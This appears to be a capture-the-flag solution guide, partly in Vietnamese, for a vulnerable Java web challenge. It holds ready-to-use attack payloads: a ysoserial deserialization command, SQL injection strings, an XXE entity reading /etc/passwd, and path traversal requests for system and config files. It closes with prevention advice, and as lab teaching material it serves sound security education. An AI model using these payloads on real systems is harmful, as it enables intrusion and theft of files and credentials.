# Challenge 5 Solution Guide

## Vulnerability Chain

Để đạt được RCE và đọc flag, cần chain các lỗ hổng sau:

1. **Java Deserialization** → RCE via Commons Collections
2. **SQL Injection** → Extract data hoặc bypass authentication
3. **Path Traversal** → Read sensitive files
4. **XXE** → File read hoặc SSRF
5. **Authorization Bypass** → Access admin endpoints

## Step-by-Step Exploitation

### Method 1: Java Deserialization

**Step 1: Create Deserialization Payload**

Sử dụng ysoserial để tạo payload:

```bash
java -jar ysoserial.jar CommonsCollections5 "id" > payload.ser
```

**Step 2: Base64 Encode**

```bash
base64 payload.ser > payload.txt
```

**Step 3: Send to Deserialize Endpoint**

```bash
POST /api/auth/deserialize
Content-Type: application/json

<base64_encoded_payload>
```

### Method 2: SQL Injection

**Step 1: Exploit SQL Injection in Employee Search**

```bash
GET /api/employees?search=' OR '1'='1' --
```

**Step 2: Extract Data**

```bash
GET /api/employees?search=' UNION SELECT 1,2,3 --
```

### Method 3: XXE

**Step 1: Create XXE Payload**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Step 2: Send to Report Endpoint**

```bash
POST /api/reports
Content-Type: application/xml

<xxe_payload>
```

### Method 4: Path Traversal

**Step 1: Exploit Path Traversal**

```bash
GET /api/admin/config?file=../../../../etc/passwd
```

**Step 2: Read Application Properties**

```bash
GET /api/admin/config?file=../../../../application.properties
```

## Complete Exploit Chain

1. **SQL Injection** để extract credentials
2. **Path Traversal** để read config files
3. **Java Deserialization** để đạt RCE
4. **XXE** để read files hoặc trigger SSRF
5. **Access Admin Endpoint** để đọc flag

## Key Learning Points

1. **Java Deserialization**: Never deserialize untrusted data
2. **SQL Injection**: Use parameterized queries
3. **Path Traversal**: Validate and sanitize file paths
4. **XXE**: Disable external entities in XML parsers
5. **Authorization**: Implement proper access control

## Prevention

1. Use safe deserialization libraries
2. Always use parameterized queries
3. Validate file paths, use whitelist
4. Disable external entities in XML
5. Implement proper RBAC

